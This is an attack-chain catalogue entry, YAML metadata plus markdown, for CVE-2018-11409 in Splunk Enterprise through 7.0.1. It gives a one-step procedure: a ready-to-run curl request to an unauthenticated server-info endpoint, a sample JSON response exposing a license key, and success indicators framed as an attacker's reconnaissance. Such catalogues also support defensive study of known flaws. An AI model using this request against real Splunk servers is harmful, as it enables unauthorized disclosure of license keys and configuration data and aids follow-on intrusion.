---
id: ac-splunk-info-disclosure-cve-2018-11409
name: >-
  Splunk Sensitive Information Disclosure via Unauthenticated Server Info
  Endpoint
tags:
  - information-disclosure
  - splunk
  - cve-2018-11409
  - reconnaissance
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-Splunk-Server-Info-Endpoint]]'
step_count: 1
techniques:
  - '[[Software]]'
updated_at: '2025-12-14T17:25:13.142Z'
description: >-
  Exploits CVE-2018-11409 in Splunk versions through 7.0.1 to access sensitive
  server information, including license keys, without authentication by directly
  requesting the server info endpoint.
skill_level: beginner
impact_level: medium
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Software]]'
---
# Splunk Sensitive Information Disclosure via Unauthenticated Server Info Endpoint

Multi-stage attack chain demonstrating a complete attack workflow.

This attack targets an information disclosure vulnerability in Splunk Enterprise versions through 7.0.1 (CVE-2018-11409), allowing unauthenticated access to sensitive server details such as the Splunk license key, server version, and configuration data. The exploit involves directly accessing a misconfigured endpoint on the Splunk web interface, which lacks proper authentication controls. This can aid attackers in reconnaissance for further exploitation, such as license key reuse or identifying vulnerable configurations. The vulnerability was reported on a U.S. Department of Defense domain via HackerOne, highlighting risks in exposed Splunk instances.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Access Endpoint] --> B[Objective: Disclose Sensitive Data]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (browser or basic HTTP client like curl)

### Target Environment

- Splunk Enterprise version <= 7.0.1
- Exposed web interface on port 8000 (default)
- No authentication required for the endpoint

### Initial Access Requirements

- Network access to the Splunk web URL (e.g., https://target.com:8000)
- No credentials needed
- Public or internal network position with reachability

## Detailed Attack Procedures

### Step 1: Access Server Info Endpoint
procedure: [[procedures/Access-Splunk-Server-Info-Endpoint]]

**Objective**: Retrieve sensitive Splunk server information, including license key and configuration details, to support reconnaissance.

**Instructions**: Use a web browser or execute [[commands/curl-splunk-server-info]] to request the vulnerable endpoint. Replace `https://splunk.example.com` with the target Splunk instance URL.

```bash
curl -k "https://splunk.example.com/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
```

**Expected Output**: JSON response containing server details, such as:

```json
{
  "serverInfo": {
    "license": {
      "key": "sensitive-license-key-here"
    },
    "version": "7.0.1",
    "serverName": "splunk-server-01"
  }
}
```

**Success Indicators**:
- JSON response received without authentication prompt
- License key or server details visible in output
- HTTP 200 status code
